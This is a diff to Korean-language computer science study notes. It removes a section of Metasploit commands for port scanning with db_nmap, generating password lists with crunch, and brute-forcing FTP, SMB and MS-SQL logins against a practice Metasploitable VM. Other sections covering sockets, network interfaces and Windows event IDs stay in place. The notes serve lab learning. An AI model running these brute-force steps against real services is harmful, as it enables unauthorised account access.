@@ -319,55 +319,10 @@ This is about computer science faced while studying or working.
         3.  설정열고 IDE Drive 삭제하고 드라이브 추가해서 ``metasploitable.vmdk``를 ``import``하고 부팅하면 된다.
         4.  기본 패스워드는 ``msfadmin/msfadmin``
     5.  다 설치 후 ``ping test``를 하면 잘 통신된다.
-59. msf
-    1.  포트 스캔
-        1.  ``service postgresql start``
-        2.  ``msfdb init``
-            1.  최초 한 번만
-        3.  ``msfconsole``
-        4.  ``db_nmap -sT -sV -O ip``
-        5.  ``db_services``
-    2.  brute-force-attack
-        1.  준비
-            1.  Crunch
-                1.  무차별 대입 공격에 필요한 비밀번호 항목을 생성할 수 있다.
-                2.  ``crunch 1 4 -f /usr/share/crunch/charset.lst numeric -o /root/passwords.txt``
-            2.  ``cat >> /root/passwords.txt`` ``postgres``
-            3.  ``cat >> /root/users.txt`` ``administrator`` ``sa`` ``root`` ``postgres``
-        2.  시작
-            1.  FTP Service
-                1.  ``use auxiliary/scanner/ftp/ftp_login``
-                2.  ``set rhosts ip``
-                3.  ``set user_file /root/users.txt``
-                4.  ``set pass_file /root/passwords.txt``
-                5.  ``set stop_on_success true``
-                6.  ``set threads 256``
-                7.  ``run``
-            2.  SMB Service
-                1.  ``use auxiliary/scanner/smb/smb_login``
-                2.  ``set rhosts ip``
-                3.  ``set user_file /root/users.txt``
-                4.  ``set pass_file /root/passwords.txt``
-                5.  ``set stop_on_success true``
-                6.  ``set threads 256``
-                7.  ``run``
-            3.  MS-SQL
-                1.  ``use auxiliary/scanner/mssql/mssql_login``
-                2.  ``set rhosts ip``
-                3.  ``set rport 1433``
-                4.  ``set user_file /root/users.txt``
-                5.  ``set pass_file /root/passwords.txt``
-                6.  ``set stop_on_success true``
-                7.  ``set threads 256``
-                8.  ``run``
-            4.  MYSQL
-                1.  3306
-            5.  Postgresql
-                1.  5432
-60. ![Payload](ref/payload.webp)
-61. Socket
+59. ![Payload](ref/payload.webp)
+60. Socket
     1.  서로 통신하는 네트워크간의 엔드포인트다.
-62. 네트워크 인터페이스
+61. 네트워크 인터페이스
     1.  lo(Loopback Interface)
         1.  시스템 내부에서 통신, 테스트, 네트워크 서비스에 사용되는 가상 네트워크 인터페이스다.
         2.  ``127.0.0.1``
@@ -387,7 +342,7 @@ This is about computer science faced while studying or working.
     9.  vmenet(VMware Network Interface)
     10. bridge
         1.  여러 네트워크를 결합하여 하나의 네트워크로 .ㅡㅊㄴㄷ만든다.
-63. 윈도우 부팅 관련 이벤트ID
+62. 윈도우 부팅 관련 이벤트ID
     1.  41
         1.  rebooted without shutting down completely
     2.  6005
